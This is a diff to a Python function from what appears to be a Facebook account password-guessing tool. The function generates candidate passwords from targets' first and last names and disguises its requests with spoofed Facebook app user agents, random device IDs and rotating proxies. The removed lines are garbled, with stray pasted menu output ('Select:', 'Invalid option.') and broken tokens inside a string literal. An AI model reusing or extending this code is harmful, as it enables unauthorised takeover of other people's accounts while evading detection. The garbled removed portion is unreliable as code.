@@ -483,19 +483,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a ="[Mozilla/5.0 (Linux; Android 9; OPPO Reno10) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/104.0.3923.122 Mobile Safari/537.36 [FBA N/FB4A; FBAV/345.0.0.43; FBDM={density=1.0,width=1220,height=2560}]
-
-Select:
-
-Invalid option.
-
-Select: 3
-
-Mozilla/5.0 (Linux; Android 12; SM-G980F) AppleWebKit/537.36 (KHT ML, like Gecko) Chrome/106.0.7387.16 Mobile Safari/537.36 [FBAN/F B4A; FBAV/294.0.0.650; FBDM={density=2.0,width=1284,height=2732}] Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 115.0) Gecko/2010010 1 Firefox/115.0
-
-Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 50) AppleWebKit/537.3 6 (KHTML, like Gecko) Chrome/110.0.9767.102 Mobile Safari/537.36 [FBAN/FB4A; FBAV/260.0.0.866; FBDM={density=3.0, width=720,height=22 80}]
-
-Mozilla/5.0 (Linux; Android 14; SM-S906N) AppleWebKit/537.36 (KHT ML, like Gecko) Chrome/101.0.7549.34 Mobile Safari/537.36 [FBAN/F B4A; FBAV/215.0.0.251; FBDM={density=1.0,width=1440,height=2560}] Mozilla/5.0 (Linux; Android 8; Pixel 8 Pro) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/103.0.1729.150 Mobile Safari/537.36 [FBA N/FB4A; FBAV/581.0.0.321; FBDM={density=1.5,width=1220,height=1920}]"
+                                u1a ="[FBAN/FB4A;FBAV/416.0.0.35.85;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/442213661;FBCR/PENNYmobil Prepaid;FBMF/Tecno;FBBD/tecno;FBDV/KF4;FBSV/12.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=3.8,width=759,height=1309};FB_FW/1;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
